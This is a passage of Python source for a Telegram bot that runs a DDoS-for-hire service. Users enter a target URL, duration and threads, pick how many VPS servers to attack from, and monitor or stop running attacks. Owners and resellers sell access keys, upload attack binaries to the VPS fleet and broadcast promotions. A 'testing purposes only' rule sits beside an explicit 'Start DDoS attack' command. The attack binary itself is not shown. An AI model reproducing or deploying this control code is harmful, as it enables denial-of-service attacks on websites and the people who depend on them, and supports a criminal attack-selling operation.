        f"VPS IPs: `{', '.join(vps_ips_to_stop)}`",
        parse_mode='MarkdownV2'
    )

    stop_tasks = []
    for vps_ip_to_stop in vps_ips_to_stop:
        found_vps = next(((ip, u, p) for ip, u, p in VPS_LIST if ip == vps_ip_to_stop), None)
        if found_vps:
            stop_tasks.append(stop_attack_on_vps(found_vps[0], found_vps[1], found_vps[2], attack_id))
        else:
            logging.warning(f"VPS {vps_ip_to_stop} not found in VPS_LIST when trying to stop attack {attack_id}")
            # Add a placeholder for VPS not found in current list
            stop_tasks.append({"vps": vps_ip_to_stop, "status": "⚠️ VPS not found in list"})

    stop_results = await asyncio.gather(*stop_tasks, return_exceptions=True)

    successful_stops = []
    failed_stops = []
    for res in stop_results:
        if isinstance(res, dict) and res.get("status", "").startswith("✅"):
            successful_stops.append(res["vps"])
        elif isinstance(res, dict):
            failed_stops.append(f"{res['vps']} \({res['status'].replace('❌ Stop Failed ', '').replace('⚠️ ', '')}\)")
        else:
            logging.error(f"Unexpected result type from stop_attack_on_vps: {res}")
            failed_stops.append(f"Unknown VPS \(Error: {res}\)")

    # Clean up running_attacks only if all stops are successful or if the attack was fully stopped
    if not failed_stops:
        if attack_id in running_attacks:
            del running_attacks[attack_id]
    else:
        # If some VPS failed to stop, update the running_attacks to reflect only those still running
        running_attacks[attack_id]['vps_ips'] = failed_stops # Store IPs that failed to stop
        running_attacks[attack_id]['status'] = 'Partial Stop'


    # Send a final report
    report_message_parts = [f"✨ *Attack Stop Report for* `{escape_markdown(target_url, version=2)}` ✨\n"]

    if successful_stops:
        report_message_parts.append(f"🟢 *Successfully stopped on {len(successful_stops)} VPS:*\n`{'`, `'.join(successful_stops)}`")
    if failed_stops:
        report_message_parts.append(f"🔴 *Failed to stop on {len(failed_stops)} VPS:*\n`{'`, `'.join(failed_stops)}`")
    if not successful_stops and not failed_stops:
        report_message_parts.append("⚠️ *No VPS were processed for stopping.*")

    await query.edit_message_text(
        "\n".join(report_message_parts),
        parse_mode='MarkdownV2'
    )


async def show_running_attacks(update: Update, context: CallbackContext):
    """Shows currently running attacks with an option to stop them."""
    if not is_authorized_user(update):
        await update.message.reply_text("❌ *You are not authorized to check running attacks!*", parse_mode='MarkdownV2')
        return

    if not running_attacks:
        await update.message.reply_text("ℹ️ *No attacks are currently running\\.*", parse_mode='MarkdownV2')
        return

    message_parts = ["📊 *Currently Running Attacks:*\n"]
    keyboard = []

    for attack_id, info in running_attacks.items():
        user = "Unknown User"
        try:
            chat = await context.bot.get_chat(info['user_id'])
            user = chat.full_name if chat.full_name else f"User {info['user_id']}"
        except Exception:
            pass # Keep "Unknown User" if fetching fails

        uptime_seconds = int(time.time() - info['start_time'])
        hours, remainder = divmod(uptime_seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{hours}h {minutes}m {seconds}s"
        
        vps_list_str = '`, `'.join(info['vps_ips'])

        message_parts.append(
            f"--- Attack ID: `{escape_markdown(attack_id, version=2)}` ---\n"
            f"👤 *Launched by*: {escape_markdown(user, version=2)}\n"
            f"🎯 *Target*: `{escape_markdown(info['target'], version=2)}`\n"
            f"⏳ *Duration*: `{info['duration']}` secs\n"
            f"🧵 *Threads*: `{info['threads']}`\n"
            f"🌐 *VPS Used*: `{len(info['vps_ips'])}` \(`{vps_list_str}`\)\n"
            f"🟢 *Status*: {escape_markdown(info['status'], version=2)}\n"
            f"⏱️ *Uptime*: {uptime_str}\n"
        )
        keyboard.append([InlineKeyboardButton(f"🛑 Stop Attack on {info['target']} by {user}", callback_data=f"stop_attack_{attack_id}")])

    reply_markup = InlineKeyboardMarkup(keyboard)

    # Combine message parts, ensuring it doesn't exceed Telegram's limit
    final_message = "\n".join(message_parts)
    if len(final_message) > 4096:
        # Truncate or split if too long
        final_message = final_message[:4000] + "...\n_Message too long, truncated._"

    await update.message.reply_text(
        final_message,
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

# --- Conversation Handlers and Entry Points (modified) ---

async def start(update: Update, context: CallbackContext) -> int:
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else update.effective_user.first_name
    chat_type = update.effective_chat.type

    if chat_type == 'private':
        # Track private chat users
        if 'users_interacted' not in context.bot_data:
            context.bot_data['users_interacted'] = set()
        context.bot_data['users_interacted'].add(user_id)
    
    # Determine appropriate keyboard
    markup = group_user_markup
    if is_owner_id(user_id):
        markup = owner_markup
    elif is_coowner_id(user_id):
        markup = co_owner_markup
    elif is_reseller_id(user_id):
        markup = reseller_markup

    welcome_msg, welcome_buttons = create_welcome_message(
        get_display_name(update.effective_chat.id if chat_type in ['group', 'supergroup'] else None),
        is_owner=is_owner_id(user_id),
        is_coowner=is_coowner_id(user_id),
        is_reseller=is_reseller_id(user_id)
    )

    image_info = get_group_image(update.effective_chat.id) if chat_type in ['group', 'supergroup'] else get_group_image('default')

    if image_info and image_info.get('url'):
        if image_info.get('type') == 'photo_id':
            await update.message.reply_photo(
                photo=image_info['url'],
                caption=f"Hey there, *{escape_markdown(username, version=2)}*!\n\n"
                        f"Welcome to {escape_markdown(OFFICIAL_GROUP_NAME, version=2) or 'our group'}\n"
                        f"{escape_markdown(image_info.get('caption', ''), version=2)}",
                parse_mode='MarkdownV2',
                reply_markup=markup
            )
        else: # Assume it's a direct URL
            await update.message.reply_photo(
                photo=image_info['url'],
                caption=f"Hey there, *{escape_markdown(username, version=2)}*!\n\n"
                        f"Welcome to {escape_markdown(OFFICIAL_GROUP_NAME, version=2) or 'our group'}\n"
                        f"{escape_markdown(image_info.get('caption', ''), version=2)}",
                parse_mode='MarkdownV2',
                reply_markup=markup
            )
    else:
        await update.message.reply_text(
            welcome_msg,
            parse_mode='MarkdownV2',
            reply_markup=markup
        )
    return ConversationHandler.END # Or NO_CHANGE if this is not part of a convo

def create_welcome_message(owner_name, is_owner=False, is_coowner=False, is_reseller=False):
    """Create welcome message with group-style buttons for everyone"""
    role_emoji = "👤"
    if is_owner: role = "👑 *Owner*"; role_emoji = "👑"
    elif is_coowner: role = "🔧 *Co-Owner*"; role_emoji = "🔧"
    elif is_reseller: role = "💰 *Reseller*"; role_emoji = "💰"
    else: role = "👤 *User*"; role_emoji = "👤"

    current_time = datetime.now().strftime("%H:%M")
    time_emoji = "🌞" if 6 <= datetime.now().hour < 18 else "🌙"
    uptime = get_uptime()
    uptime_emoji = "⏳"

    banner = r"""
╔════════════════════════════════════╗
║                                    ║
║ 🚀 *WELCOME TO THE BOT* 🚀         ║
║                                    ║
╚════════════════════════════════════╝
"""
    welcome_msg = (
        f"{escape_markdown(banner, version=2)}\n\n"
        f"{role_emoji} *Your Role*: {role}\n"
        f"🤖 *Bot Owner*: {escape_markdown(owner_name, version=2)}\n"
        f"{time_emoji} *Current Time*: {current_time}\n"
        f"{uptime_emoji} *Bot Uptime*: {uptime}\n\n"
        f"✨ *Available Commands*:\n"
        f"• `/start` \- Show this message\n"
        f"• `Attack` \- Start DDoS attack\n"
        f"• `Redeem Key` \- Activate your access\n"
        f"• `Status` \- Check your key status\n\n"
        f"Use the buttons below to get started\\!"
    )
    return welcome_msg, group_user_markup # Return the message and the appropriate markup

async def attack_cmd(update: Update, context: CallbackContext) -> int:
    """Initiates the attack conversation."""
    user_id = update.effective_user.id
    if not is_authorized_user(update): # Assuming all roles can initiate attack for now
        await update.message.reply_text("❌ *You are not authorized to launch attacks!*", parse_mode='MarkdownV2')
        return ConversationHandler.END

    # Check for active key (if applicable) - example, uncomment if key system is fully implemented for attacks
    # if user_id not in redeemed_users or redeemed_users[user_id] < time.time():
    #     await update.message.reply_text("❌ Your key has expired or you don't have an active key!", parse_mode='Markdown')
    #     return ConversationHandler.END

    context.user_data['attack_params'] = {}
    await update.message.reply_text(
        "⚡️ *Enter attack details:*\n\n"
        "Format: `URL DURATION THREADS`\n"
        "Example: `http://example.com 600 500`\n\n"
        "⏳ *Max Duration*: `{max_duration}` seconds\n"
        "🧵 *Max Threads*: `{MAX_THREADS}`",
        parse_mode='MarkdownV2'
    )
    return GET_ATTACK_ARGS

async def get_attack_args(update: Update, context: CallbackContext) -> int:
    """Parses attack arguments and prompts for VPS count."""
    args = update.message.text.strip().split()
    if len(args) != 3:
        await update.message.reply_text("❌ *Invalid format!* Please use `URL DURATION THREADS`", parse_mode='MarkdownV2')
        return ConversationHandler.END

    target_url = args[0]
    try:
        duration = int(args[1])
        threads = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ *Duration and Threads must be numbers!*", parse_mode='MarkdownV2')
        return ConversationHandler.END

    # Basic validation (can be expanded)
    if not (1 <= duration <= max_duration) or not (1 <= threads <= MAX_THREADS):
        await update.message.reply_text(
            f"❌ *Invalid Duration or Threads!*\n"
            f"Duration must be between `1` and `{max_duration}`.\n"
            f"Threads must be between `1` and `{MAX_THREADS}`.",
            parse_mode='MarkdownV2'
        )
        return ConversationHandler.END

    context.user_data['attack_params'] = {
        'target_url': target_url,
        'duration': duration,
        'threads': threads
    }
    
    # Prompt for VPS count with dynamic buttons
    available_vps_count = len(VPS_LIST)
    
    if available_vps_count == 0:
        await update.message.reply_text("❌ *No VPS configured!* Cannot launch attack.", parse_mode='MarkdownV2')
        return ConversationHandler.END

    keyboard_rows = []
    # Add buttons for specific counts (1, 2, 3, etc. up to ACTIVE_VPS_COUNT or a sensible limit like 5)
    for i in range(1, min(available_vps_count, 5) + 1): # Show buttons for 1 to 5, or available if less
        keyboard_rows.append([InlineKeyboardButton(f"{i} VPS", callback_data=f"select_vps_{i}")])
    
    # Add "All Available" button
    if available_vps_count > 1:
        keyboard_rows.append([InlineKeyboardButton(f"🚀 All Available ({available_vps_count}) VPS", callback_data=f"select_vps_all")])
    
    keyboard_rows.append([InlineKeyboardButton("↩️ Cancel Attack", callback_data="cancel_attack")])

    reply_markup = InlineKeyboardMarkup(keyboard_rows)

    await update.message.reply_text(
        f"🌐 *Attack parameters set!* Now, how many VPS do you want to use for this attack?\n\n"
        f"• *Available VPS*: `{available_vps_count}`\n"
        f"• *Recommended Max for General Use*: `{ACTIVE_VPS_COUNT}`\n\n"
        f"Choose an option below or type a number `(1-{available_vps_count})`:",
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )
    return GET_MULTI_VPS_COUNT

async def get_multi_vps_count(update: Update, context: CallbackContext) -> int:
    """Handles the user's input for the number of VPS to use."""
    text = update.message.text
    num_vps_to_use = 0
    try:
        num_vps_to_use = int(text.strip())
    except ValueError:
        await update.message.reply_text("❌ *Invalid input!* Please enter a number.", parse_mode='MarkdownV2')
        return GET_MULTI_VPS_COUNT # Stay in this state

    available_vps_count = len(VPS_LIST)
    if not (1 <= num_vps_to_use <= available_vps_count):
        await update.message.reply_text(
            f"❌ *Invalid VPS count!* Please choose a number between `1` and `{available_vps_count}`.",
            parse_mode='MarkdownV2'
        )
        return GET_MULTI_VPS_COUNT # Stay in this state

    attack_params = context.user_data.get('attack_params')
    if not attack_params:
        await update.message.reply_text("⚠️ *Attack parameters not found!* Please start a new attack with /attack.", parse_mode='MarkdownV2')
        return ConversationHandler.END

    target_url = attack_params['target_url']
    duration = attack_params['duration']
    threads = attack_params['threads']

    await start_multi_vps_attack(update, context, target_url, duration, threads, num_vps_to_use)
    return ConversationHandler.END

async def handle_vps_selection_callback(update: Update, context: CallbackContext) -> int:
    """Handles inline button clicks for VPS selection."""
    query = update.callback_query
    await query.answer() # Acknowledge the button press

    if query.data == "cancel_attack":
        await query.edit_message_text("🚫 *Attack initiation cancelled.*", parse_mode='MarkdownV2')
        context.user_data.pop('attack_params', None)
        return ConversationHandler.END
    
    if not query.data.startswith("select_vps_"):
        return ConversationHandler.END # Not our callback

    selection_type = query.data.replace("select_vps_", "")
    
    attack_params = context.user_data.get('attack_params')
    if not attack_params:
        await query.edit_message_text("⚠️ *Attack parameters not found!* Please start a new attack with /attack.", parse_mode='MarkdownV2')
        return ConversationHandler.END

    target_url = attack_params['target_url']
    duration = attack_params['duration']
    threads = attack_params['threads']
    
    available_vps_count = len(VPS_LIST)

    if selection_type == "all":
        num_vps_to_use = available_vps_count
    else:
        try:
            num_vps_to_use = int(selection_type)
            if not (1 <= num_vps_to_use <= available_vps_count):
                await query.edit_message_text(
                    f"❌ *Invalid VPS count selected!* Please choose a number between `1` and `{available_vps_count}`.",
                    parse_mode='MarkdownV2'
                )
                return ConversationHandler.END
        except ValueError:
            await query.edit_message_text("❌ *Invalid selection!*", parse_mode='MarkdownV2')
            return ConversationHandler.END

    await start_multi_vps_attack(query, context, target_url, duration, threads, num_vps_to_use)
    return ConversationHandler.END

# --- Remaining Handlers (Integrate existing ones and add new ones) ---

async def owner_settings(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can access these settings!*", parse_mode='MarkdownV2')
        return

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)

    await update.message.reply_text(
        f"⚙️ *Owner Settings Menu*\n\n"
        f"Select an option below:\n\n"
        f"👑 *Bot Owner*: {escape_markdown(current_display_name, version=2)}",
        parse_mode='MarkdownV2',
        reply_markup=owner_settings_markup
    )

async def set_vps_count(update: Update, context: CallbackContext):
    """Handler for setting the number of active VPS servers"""
    try:
        if not is_owner(update) and not is_co_owner(update):
            await update.message.reply_text(
                "🚫 *Access Denied*\nOnly owner or co-owners can configure VPS!",
                parse_mode='MarkdownV2'
            )
            return ConversationHandler.END

        if not VPS_LIST:
            await update.message.reply_text(
                "❌ *No VPS Configured*\nPlease set up VPS servers first!",
                parse_mode='MarkdownV2'
            )
            return ConversationHandler.END

        status_msg = (
            f"⚙️ *VPS Configuration*\n\n"
            f"• *Current Active VPS*: `{ACTIVE_VPS_COUNT}`\n"
            f"• *Total Available VPS*: `{len(VPS_LIST)}`\n"
            f"• *Recommended Max*: `{min(4, len(VPS_LIST))}`\n\n"
            f"Please enter new VPS count `(1-{len(VPS_LIST)})`:"
        )

        await update.message.reply_text(
            status_msg,
            parse_mode='MarkdownV2',
            reply_markup=ReplyKeyboardMarkup(
                [["1", "2"], ["3", "4"], ["Cancel"]],
                one_time_keyboard=True
            )
        )
        return GET_VPS_COUNT

    except Exception as e:
        logging.error(f"Error in set_vps_count: {str(e)}")
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to initialize VPS configuration",
            parse_mode='MarkdownV2'
        )
        return ConversationHandler.END

async def set_vps_count_input(update: Update, context: CallbackContext):
    global ACTIVE_VPS_COUNT
    user_id = update.effective_user.id
    try:
        count = int(update.message.text.strip())

        if is_owner(update):
            max_allowed = len(VPS_LIST)
        elif is_co_owner(update):
            max_allowed = min(4, len(VPS_LIST))
        else:
            await update.message.reply_text(
                "❌ *Only owner or co-owners can configure VPS!*",
                parse_mode='MarkdownV2'
            )
            return ConversationHandler.END

        if 1 <= count <= max_allowed:
            ACTIVE_VPS_COUNT = count
            if is_owner(update) or is_co_owner(update):
                USER_VPS_PREFERENCES[user_id] = count
            await update.message.reply_text(
                f"✅ *VPS Configuration Updated*\n"
                f"• *Active VPS Count*: `{count}`\n"
                f"• *Max Allowed*: `{max_allowed}`",
                parse_mode='MarkdownV2'
            )
            logging.info(f"User {user_id} set VPS count to {count}")
        else:
            await update.message.reply_text(
                f"❌ *Invalid VPS Count*\n"
                f"You can only set between `1` and `{max_allowed}` VPS\n\n"
                f"*Current active VPS*: `{ACTIVE_VPS_COUNT}`",
                parse_mode='MarkdownV2'
            )

    except ValueError:
        await update.message.reply_text(
            "❌ *Invalid Input*\nPlease enter a number between `1` and your max allowed VPS count",
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        logging.error(f"Error in set_vps_count_input: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "⚠️ *System Error*\nFailed to update VPS configuration",
            parse_mode='MarkdownV2'
        )
    return ConversationHandler.END

async def promote(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only owner can promote\\!*",
            parse_mode='MarkdownV2'
        )
        return

    promotion_message = (
        "🔰 *Join our groups for more information, free keys, and hosting details\\!*\n\n"
        "Click the buttons below to join\\:"
    )

    keyboard = []
    if 'link_1' in LINKS and LINKS['link_1']:
        keyboard.append([InlineKeyboardButton("Join Group 1", url=LINKS['link_1'])])
    if 'link_2' in LINKS and LINKS['link_2']:
        keyboard.append([InlineKeyboardButton("Join Group 2", url=LINKS['link_2'])])
    if 'link_3' in LINKS and LINKS['link_3']:
        keyboard.append([InlineKeyboardButton("Join Group 3", url=LINKS['link_3'])])
    if 'link_4' in LINKS and LINKS['link_4']:
        keyboard.append([InlineKeyboardButton("Join Group 4", url=LINKS['link_4'])])

    if not keyboard:
        await update.message.reply_text(
            "ℹ️ No links have been set up yet\\. Use the 'Manage Links' option to add links\\.",
            parse_mode='MarkdownV2'
        )
        return

    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await update.message.reply_text(
            promotion_message,
            parse_mode='MarkdownV2',
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Error sending initial promotion message: {str(e)}")
        await update.message.reply_text(
            "❌ Failed to send promotion message\\!",
            parse_mode='MarkdownV2'
        )
        return

    success_count = 0
    fail_count = 0
    group_success = 0
    private_success = 0

    all_chats = set()
    for group_id in ALLOWED_GROUP_IDS:
        all_chats.add(group_id)

    if 'users_interacted' in context.bot_data:
        for user_id_tracked in context.bot_data['users_interacted']:
            all_chats.add(user_id_tracked)

    for chat_id in all_chats:
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=promotion_message,
                parse_mode='MarkdownV2',
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            success_count += 1
            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    group_success += 1
                else:
                    private_success += 1
            except Exception as e:
                logging.error(f"Error getting chat info for {chat_id}: {str(e)}")
            await asyncio.sleep(0.5)
        except Exception as e:
            logging.error(f"Failed to send promotion to {chat_id}: {str(e)}")
            fail_count += 1

    try:
        await update.message.reply_text(
            f"📊 *Promotion Results*\n\n"
            f"✅ *Successfully sent to\\*: {success_count} chats\n"
            f"❌ *Failed to send to\\*: {fail_count} chats\n\n"
            f"• *Groups\\*: {group_success}\n"
            f"• *Private chats\\*: {private_success}",
            parse_mode='MarkdownV2'
        )
    except Exception as e:
        logging.error(f"Error sending promotion results: {str(e)}")
        await update.message.reply_text(
            "❌ Failed to send promotion results\\!",
            parse_mode='MarkdownV2'
        )

async def manage_links(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can manage links!", parse_mode='MarkdownV2')
        return

    current_links = (
        "🔗 *Link Management*\n\n"
        "Current Links:\n"
        f"1. `{escape_markdown(LINKS.get('link_1', 'Not set'), version=2)}`\n"
        f"2. `{escape_markdown(LINKS.get('link_2', 'Not set'), version=2)}`\n"
        f"3. `{escape_markdown(LINKS.get('link_3', 'Not set'), version=2)}`\n"
        f"4. `{escape_markdown(LINKS.get('link_4', 'Not set'), version=2)}`\n\n"
        "Enter the number (1, 2, 3, or 4) of the link you want to replace:"
    )

    await update.message.reply_text(
        current_links,
        parse_mode='MarkdownV2'
    )
    return GET_LINK_NUMBER

async def get_link_number(update: Update, context: CallbackContext):
    try:
        link_num = int(update.message.text)
        if link_num not in [1, 2, 3, 4]:
            raise ValueError

        context.user_data['editing_link'] = f"link_{link_num}"
        await update.message.reply_text(
            f"⚠️ Enter new URL for link {link_num}:",
            parse_mode='MarkdownV2'
        )
        return GET_LINK_URL
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter `1`, `2`, `3`, or `4`\\.",
            parse_mode='MarkdownV2'
        )
        return ConversationHandler.END

async def get_link_url(update: Update, context: CallbackContext):
    if 'editing_link' not in context.user_data:
        return ConversationHandler.END

    link_key = context.user_data['editing_link']
    new_url = update.message.text.strip()

    if not (new_url.startswith('http://') or new_url.startswith('https://')):
        await update.message.reply_text("❌ Invalid URL! Must start with `http://` or `https://`", parse_mode='MarkdownV2')
        return ConversationHandler.END

    LINKS[link_key] = new_url
    save_links()

    context.user_data.pop('editing_link', None)

    await update.message.reply_text(
        "✅ Link updated successfully\\!\n"
        f"New URL: `{escape_markdown(new_url, version=2)}`",
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

async def broadcast_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only the owner can broadcast messages\\!*",
            parse_mode='MarkdownV2'
        )
        return ConversationHandler.END

    await update.message.reply_text(
        "⚠️ *Enter the message you want to broadcast to all channels, groups and private chats\\:*\n"
        "You can send text, photos \\(with optional caption\\), or documents \\(with optional caption\\)\\.\n\n"
        "Or reply to any message with /broadcast to forward it to all chats\\.",
        parse_mode='MarkdownV2'
    )
    return GET_BROADCAST_MESSAGE

async def broadcast_message(update: Update, context: CallbackContext):
    message_to_broadcast = update.message.reply_to_message if update.message.reply_to_message else update.message

    results = {
        'success': 0,
        'failed': 0,
        'groups': 0,
        'private': 0
    }

    target_chats = set(ALLOWED_GROUP_IDS)
    if 'users_interacted' in context.bot_data:
        target_chats.update(context.bot_data['users_interacted'])

    for chat_id in target_chats:
        try:
            await message_to_broadcast.forward(chat_id=chat_id)
            results['success'] += 1

            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    results['groups'] += 1
                else:
                    results['private'] += 1
            except Exception as e:
                logging.warning(f"Couldn't determine chat type for {chat_id}: {e}")

            await asyncio.sleep(0.3)
        except Exception as e:
            logging.error(f"Failed to broadcast to {chat_id}: {str(e)}")
            results['failed'] += 1

    report_message = (
        f"📊 *Broadcast Results*\n\n"
        f"✅ *Successfully sent to\\*: `{results['success']}` chats\n"
        f"❌ *Failed to send to\\*: `{results['failed']}` chats\n\n"
        f"• *Groups\\*: `{results['groups']}`\n"
        f"• *Private chats\\*: `{results['private']}`"
    )

    await update.message.reply_text(
        report_message,
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END

async def track_new_chat(update: Update, context: CallbackContext):
    """Tracks new users in private chats and new group members."""
    chat = update.effective_chat
    user = update.effective_user

    if chat.type == 'private':
        if 'users_interacted' not in context.bot_data:
            context.bot_data['users_interacted'] = set()
        context.bot_data['users_interacted'].add(user.id)
        logging.info(f"Tracked new private chat with user: {user.full_name} ({user.id})")
    elif chat.type in ['group', 'supergroup']:
        if update.message.new_chat_members:
            for member in update.message.new_chat_members:
                if member.id == context.bot.id:
                    if chat.id not in ALLOWED_GROUP_IDS:
                        ALLOWED_GROUP_IDS.append(chat.id)
                        logging.info(f"Added new group {chat.title} ({chat.id}) to ALLOWED_GROUP_IDS.")
                    else:
                        logging.info(f"Bot re-added to existing allowed group: {chat.title} ({chat.id})")
        logging.info(f"Bot activity in group: {chat.title} ({chat.id})")
    # You might want to save ALLOWED_GROUP_IDS and users_interacted to disk here or periodically

async def track_left_chat(update: Update, context: CallbackContext):
    """Handles bot being removed from a chat."""
    chat_member = update.chat_member
    if chat_member.old_chat_member.status in ['member', 'administrator'] and \
       chat_member.new_chat_member.status == 'left':
        chat_id = chat_member.chat.id
        if chat_id in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(chat_id)
            logging.info(f"Bot removed from group {chat_member.chat.title} ({chat_id}). Removed from ALLOWED_GROUP_IDS.")
        else:
            logging.info(f"Bot removed from untracked group {chat_member.chat.title} ({chat_id}).")
    elif chat_member.new_chat_member.status == 'kicked':
        chat_id = chat_member.chat.id
        if chat_id in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(chat_id)
            logging.info(f"Bot kicked from group {chat_member.chat.title} ({chat_id}). Removed from ALLOWED_GROUP_IDS.")
        else:
            logging.info(f"Bot kicked from untracked group {chat_member.chat.title} ({chat_id}).")

async def handle_button_click(update: Update, context: CallbackContext):
    """Handles general button clicks that are not inline keyboard callbacks."""
    text = update.message.text
    if text == "Attack":
        return await attack_cmd(update, context)
    elif text == "Redeem Key":
        await update.message.reply_text("🔑 Please send me your key to redeem it!", parse_mode='MarkdownV2')
        return GET_KEY # Assuming GET_KEY is the state for redeeming keys
    elif text == "Rules":
        await update.message.reply_text("📜 *Bot Rules:*\n\n1. Do not use the bot for illegal activities.\n2. Do not spam.\n3. Respect other users.\n4. Attacks are for testing purposes only.\n\nThank you for cooperating!", parse_mode='MarkdownV2')
    elif text == "🔍 Status":
        user_id = update.effective_user.id
        if user_id in redeemed_users:
            expiration_time = redeemed_users[user_id]
            if isinstance(expiration_time, dict): # For special keys
                expiration_time = expiration_time.get('expiration_time')

            if expiration_time > time.time():
                remaining_time = int(expiration_time - time.time())
                days, remainder = divmod(remaining_time, 86400)
                hours, remainder = divmod(remainder, 3600)
                minutes, seconds = divmod(remainder, 60)
                await update.message.reply_text(
                    f"✅ *Your key is active!* Expires in: `{days}d {hours}h {minutes}m {seconds}s`",
                    parse_mode='MarkdownV2'
                )
            else:
                await update.message.reply_text("❌ *Your key has expired!*", parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("ℹ️ *You don't have an active key. Please redeem one!*", parse_mode='MarkdownV2')
    elif text == "⏳ Uptime":
        await update.message.reply_text(f"🤖 *Bot Uptime*: `{get_uptime()}`", parse_mode='MarkdownV2')
    elif text == "Settings":
        if is_owner_id(update.effective_user.id):
            await update.message.reply_text("⚙️ *Admin Settings Menu*", reply_markup=settings_markup, parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("❌ *You are not authorized to access settings!*", parse_mode='MarkdownV2')
    elif text == "Add VPS":
        # Placeholder for Add VPS flow (if not already handled by a ConversationHandler)
        await update.message.reply_text("➕ *To add a VPS, please provide details in the format:* `IP,USERNAME,PASSWORD`", parse_mode='MarkdownV2')
        return GET_VPS_INFO # Assuming GET_VPS_INFO is the state to handle this
    elif text == "Delete Key":
        # Placeholder for Delete Key flow
        await update.message.reply_text("🗑️ *Enter the key you want to delete:*", parse_mode='MarkdownV2')
        return GET_DELETE_KEY # Assuming GET_DELETE_KEY is the state
    elif text == "OpenBot" or text == "CloseBot":
        # Placeholder for Open/Close Bot functionality
        await update.message.reply_text("⚠️ This feature is under development\\.", parse_mode='MarkdownV2')
    elif text == "Menu":
        # Placeholder for owner/co-owner menu
        user_id = update.effective_user.id
        if is_owner_id(user_id):
            await update.message.reply_text("👑 *Owner Menu*", reply_markup=owner_menu_markup, parse_mode='MarkdownV2')
        elif is_coowner_id(user_id):
            await update.message.reply_text("🔧 *Co-Owner Menu*", reply_markup=co_owner_menu_markup, parse_mode='MarkdownV2')
        else:
            await update.message.reply_text("❌ *You are not authorized to access this menu!*", parse_mode='MarkdownV2')
    elif text == "⚙️ Owner Settings":
        return await owner_settings(update, context) # Call the owner settings handler
    elif text == "👥 Check Users":
        return await show_users(update, context) # Call the show users handler
    elif text == "🔗 Manage Links":
        return await manage_links(update, context)
    elif text == "📢 Broadcast":
        return await broadcast_start(update, context)
    elif text == "🖼️ Set Group Image":
        return await set_group_image_handler(update, context)
    elif text == "🔗 Set Group Link":
        return await set_group_link_handler(update, context)
    elif text == "Back to Home":
        # Determine appropriate keyboard for user's role
        user_id = update.effective_user.id
        markup = group_user_markup
        if is_owner_id(user_id):
            markup = owner_markup
        elif is_coowner_id(user_id):
            markup = co_owner_markup
        elif is_reseller_id(user_id):
            markup = reseller_markup
        await update.message.reply_text("🏡 *Welcome back!*", reply_markup=markup, parse_mode='MarkdownV2')
    elif text == "Reset VPS":
        return await reset_vps(update, context)
    elif text == "Add Bot" or text == "Remove Bot" or text == "Bot List" or \
         text == "Start Selected Bot" or text == "Stop Selected Bot":
        await update.message.reply_text("⚠️ Bot management features are under development and require manual configuration for now\\.", parse_mode='MarkdownV2')
    elif text == "Promote":
        return await promote(update, context)
    elif text == "Set Display Name":
        await update.message.reply_text("✍️ *Enter the new display name:*\n\n"
                                        "_This will appear as the bot owner's name\\._", parse_mode='MarkdownV2')
        return GET_DISPLAY_NAME
    elif text == "Add VPS":
        await update.message.reply_text("➕ *Enter VPS details in format:* `IP,USERNAME,PASSWORD`", parse_mode='MarkdownV2')
        return GET_VPS_INFO
    elif text == "Remove VPS":
        await update.message.reply_text("🗑️ *Enter the IP of the VPS to remove:*", parse_mode='MarkdownV2')
        return GET_VPS_TO_REMOVE
    elif text == "Upload Binary":
        await update.message.reply_text("⬆️ *Send the binary file you want to upload. Make sure it's compiled for Linux x64.*", parse_mode='MarkdownV2')
        return CONFIRM_BINARY_UPLOAD
    elif text == "Delete Binary":
        await update.message.reply_text("🗑️ *Are you sure you want to delete the binary on all VPS?* Type `yes` to confirm.", parse_mode='MarkdownV2')
        return CONFIRM_BINARY_DELETE
    elif text == "Set Duration":
        await update.message.reply_text("⏳ *Enter the new default attack duration in seconds:*", parse_mode='MarkdownV2')
        return GET_SET_DURATION
    elif text == "Set Threads":
        await update.message.reply_text("🧵 *Enter the new default attack threads:*", parse_mode='MarkdownV2')
        return GET_SET_THREADS
    elif text == "Add Reseller":
        await update.message.reply_text("💰 *Enter the Telegram User ID of the new reseller:*", parse_mode='MarkdownV2')
        return GET_RESELLER_ID
    elif text == "Remove Reseller":
        await update.message.reply_text("❌ *Enter the Telegram User ID of the reseller to remove:*", parse_mode='MarkdownV2')
        return GET_REMOVE_RESELLER_ID
    elif text == "Add Coin":
        await update.message.reply_text("🪙 *Enter the user ID to add coins to:*", parse_mode='MarkdownV2')
        return GET_ADD_COIN_USER_ID
    elif text == "Set Cooldown":
        await update.message.reply_text("❄️ *Enter the new global cooldown duration in seconds (0 for no cooldown):*", parse_mode='MarkdownV2')
        return GET_SET_COOLDOWN
    elif text == "Generate Key":
        await update.message.reply_text("🔑 *Select key type:*\n\n"
                                        "• `Regular`\n"
                                        "• `Special`", parse_mode='MarkdownV2')
        return GET_KEY_TYPE
